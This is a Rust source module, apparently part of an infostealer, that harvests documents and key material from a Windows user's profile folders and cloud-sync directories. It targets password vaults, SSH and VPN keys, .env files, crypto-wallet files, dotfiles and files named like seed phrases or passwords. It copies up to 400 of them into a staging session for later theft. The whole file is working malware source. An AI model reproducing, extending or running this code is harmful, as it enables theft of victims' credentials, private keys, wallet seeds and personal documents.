//! Document and key-material harvesting from the usual user folders.

use std::collections::HashSet;
use std::path::Path;

use walkdir::WalkDir;

use crate::session::Session;
use crate::util;

const EXTENSIONS: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "csv", "txt", "rtf", "odt", "ods", "odp",
    "kdbx", "key", "pem", "ppk", "ovpn", "rdp", "env", "wallet", "dat", "db", "sql", "bak",
    "jpg", "jpeg", "png", "gif", "bmp", "webp", "heic",
];

const NAME_HINTS: &[&str] = &[
    "seed", "recovery", "mnemonic", "passphrase", "backup", "password", "passwords", "wallet",
    "keystore", "private", "secret",
];

const MAX_DEPTH: usize = 4;
const MAX_FILES: usize = 400;
const MAX_FILE_BYTES: u64 = 12 * 1024 * 1024;
const TOTAL_BUDGET: u64 = 120 * 1024 * 1024;

fn interesting(path: &Path) -> bool {
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    if name.starts_with('.') {
        return true;
    }
    let extension = path
        .extension()
        .map(|e| e.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    if EXTENSIONS.contains(&extension.as_str()) {
        return true;
    }
    NAME_HINTS.iter().any(|hint| name.contains(hint))
}

fn roots() -> Vec<std::path::PathBuf> {
    let profile = util::user_profile();
    let mut out = Vec::new();
    for name in ["Desktop", "Documents", "Downloads", "Pictures", "OneDrive", "Dropbox"] {
        let path = profile.join(name);
        if path.is_dir() {
            out.push(path);
        }
    }
    if let Some(public) = util::env_path("PUBLIC") {
        let path = public.join("Documents");
        if path.is_dir() {
            out.push(path);
        }
    }
    out
}

pub fn collect(session: &mut Session) {
    let mut seen: HashSet<String> = HashSet::new();
    let mut copied = 0usize;
    let mut spent = 0u64;

    'outer: for root in roots() {
        for entry in WalkDir::new(&root)
            .max_depth(MAX_DEPTH)
            .follow_links(false)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            if copied >= MAX_FILES || spent >= TOTAL_BUDGET {
                break 'outer;
            }
            if !entry.file_type().is_file() || !interesting(entry.path()) {
                continue;
            }
            let Ok(meta) = entry.metadata() else { continue };
            if meta.len() == 0 || meta.len() > MAX_FILE_BYTES {
                continue;
            }
            let Ok(relative) = entry.path().strip_prefix(&root) else {
                continue;
            };
            let folder = root
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| String::from("files"));
            let key = entry.path().to_string_lossy().to_ascii_lowercase();
            if !seen.insert(key) {
                continue;
            }
            let target = format!(
                "documents/{folder}/{}",
                relative.to_string_lossy().replace('\\', "/")
            );
            if session.copy(entry.path(), &target) {
                copied += 1;
                spent += meta.len();
            }
        }
    }

    if copied == 0 {
        session.note("documents: nothing found");
    } else {
        session.note(&format!(
            "documents: {copied} files, {}",
            util::human_size(spent)
        ));
        session.line(&format!("documents: {copied} files ({})", util::human_size(spent)));
    }
}
